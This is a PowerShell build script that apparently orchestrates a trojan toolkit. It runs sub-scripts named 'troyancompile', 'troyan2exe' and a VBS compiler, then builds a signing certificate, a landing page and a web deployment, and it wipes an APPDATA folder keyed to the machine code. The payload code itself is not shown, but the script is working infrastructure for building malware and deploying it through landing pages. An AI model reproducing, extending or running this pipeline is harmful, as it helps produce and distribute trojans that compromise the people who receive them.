param (
    [string]$serverName, [string]$action = "apply", [string]$kill="kill", [string]$refiner
)

$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-Location -Path $scriptDir
. ".\lib.ps1"

if ($serverName -eq "") {
    $serverName = detectServer
    $action = "apply"
} 

if ([string]::IsNullOrEmpty($serverName))
{
    throw "compile.ps1 -serverName argument is null"
}

$currentScriptPath = $PSScriptRoot

if (-not (Test-Path "C:\data"))
{
    New-Item -Path "C:\data" -ItemType Directory -Force
}



if ($refiner -ne "refiner")
{
    $refinerPath = Join-Path -Path $currentScriptPath -ChildPath "../Refiner/bin/debug/net9.0/Refiner.exe"
    if (Test-Path $refinerPath) {
        & $refinerPath $serverName "none"
    } else {
        Write-Error "The light file '$refinerPath' does not exist."
    }
}

function Kill-TaskByName {
    param (
        [string]$TaskName
    )
    $processes = Get-Process | Where-Object { $_.Name -like "*$TaskName*" }
    if ($processes) {
        foreach ($process in $processes) {
            try {
                Stop-Process -Id $process.Id -Force
                Write-Host "Killed process: $($process.Name) (ID: $($process.Id))"
            } catch {
                Write-Host "Failed to kill process: $($process.Name) (ID: $($process.Id)) - $_"
            }
        }
    } else {
        Write-Host "No processes found matching '$TaskName'."
    }
}
if ($kill -eq "kill" -and $refiner -ne "refiner")
{
    Kill-TaskByName -TaskName "Refiner"
}

#currents
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-Location -Path $scriptDir
. ".\current.ps1" -serverName $serverName
. "..\troyan\troyanps\utils.ps1"
if ([string]::IsNullOrEmpty($server.rootDir)) {
    throw "compile1.ps1 - server is not linked"
}

$hep = Get-MachineCode
if ([string]::IsNullOrEmpty($hep) -eq $false)
{
    $folderPath = [System.IO.Path]::Combine($env:APPDATA, $hep)
    if (Test-Path -Path $folderPath) {
        Remove-Item "$folderPath\*" -Recurse -Force
    }
}

#cert
& (Join-Path -Path $scriptDir -ChildPath "./compile.cert.ps1") -serverName $serverName

#general script
& (Join-Path -Path $server.troyanDir -ChildPath "./troyancompile.ps1") -serverName $serverName

#general script to exe
& (Join-Path -Path $server.troyanDir -ChildPath "./troyan2exe.ps1") -serverName $serverName

#vbs
& (Join-Path -Path $server.troyanVbsDir -ChildPath "./vbscompile.ps1") -serverName $serverName

#dn
& (Join-Path -Path $scriptDir -ChildPath "./compile.dn.ps1") -serverName $serverName

#landing
& (Join-Path -Path $scriptDir -ChildPath "./compile.landing.ps1") -serverName $serverName

#web
if ($action -eq "apply")
{
    & (Join-Path -Path $scriptDir -ChildPath "./compile.web.ps1") -serverName $serverName -action $action
}

Write-Host "Compile complete"